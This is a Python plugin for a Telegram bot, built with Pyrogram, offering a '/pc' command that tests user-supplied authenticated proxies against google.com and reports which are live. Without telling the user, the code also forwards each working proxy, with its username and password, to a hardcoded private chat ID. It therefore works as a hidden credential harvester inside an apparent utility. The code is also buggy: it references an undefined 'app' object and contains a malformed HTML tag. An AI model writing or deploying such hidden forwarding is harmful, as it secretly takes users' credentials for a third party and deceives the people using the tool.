from pyrogram import Client, filters
import requests
import time

FORWARD_CHAT_ID = -1002140459626
ERROR_LOG_FILE = "errorlogs.txt"
def check_proxy(proxy):
    try:
        start_time = time.time()
        proxy_ip = proxy.split(":")[0]
        proxy_port = proxy.split(":")[1]
        proxy_user = proxy.split(":")[2]
        proxy_password = proxy.split(":")[3]

        proxies = {
            "http": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
            "https": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}"
        }

        response = requests.get("http://www.google.com", proxies=proxies, timeout=15)
        end_time = time.time()
        time_taken = round(end_time - start_time, 2)

        if response.status_code == 200:
            return {"status": "live", "time_taken": time_taken}
        else:
            return {"status": "dead", "time_taken": time_taken}
    except Exception as e:
        with open(ERROR_LOG_FILE, "a") as error_file:
            error_file.write(f"Error checking proxy {proxy}: {str(e)}\n")
        return {"status": "error", "error_message": str(e)}

@Client.on_message(filters.command("pc"))
def check_proxies_command(client, message):
    proxies_to_check = message.text.split(" ", 1)[1].split("\n")
    num_proxies = len(proxies_to_check)
    num_live_proxies = 0
    num_dead_proxies = 0
    live_proxies = []
    dead_proxies = []
    time_taken_total = 0

    for proxy in proxies_to_check:
        result = check_proxy(proxy)
        time_taken = result.get("time_taken", 0)  # Set default time taken to 0 if not available

        time_taken_total += time_taken

        if result["status"] == "live":
            num_live_proxies += 1
            live_proxies.append(proxy)
            app.send_message(FORWARD_CHAT_ID, f"Live Proxy: {proxy}")
        elif result["status"] == "dead":
            num_dead_proxies += 1
            dead_proxies.append(proxy)

    live_emoji = "✅"
    dead_emoji = "❌"

    live_proxies_text = "\n".join([f"{live_emoji} {proxy}" for proxy in live_proxies])
    dead_proxies_text = "\n".join([f"{dead_emoji} {proxy}" for proxy in dead_proxies])

    user_info = f"Checker By User: {message.from_user.id} {message.from_user.username}"
    time_taken_info = f"Time Taken: {time_taken_total} seconds"

    reply_text = f"<b>Number of Proxies Provided</b>: <i>{num_proxies}</i,>\n<b>Number of Proxies Alive:</b> <i>{num_live_proxies}</i>\n<b>Number of Proxies Dead:</b> <i>{num_dead_proxies}</i>\n\n<b>Live Proxies{live_emoji}:\n{live_proxies_text}\n\nDead Proxies </b>{dead_emoji}:\n{dead_proxies_text}\n\n{user_info}\n{time_taken_info}"

    message.reply_text(reply_text)
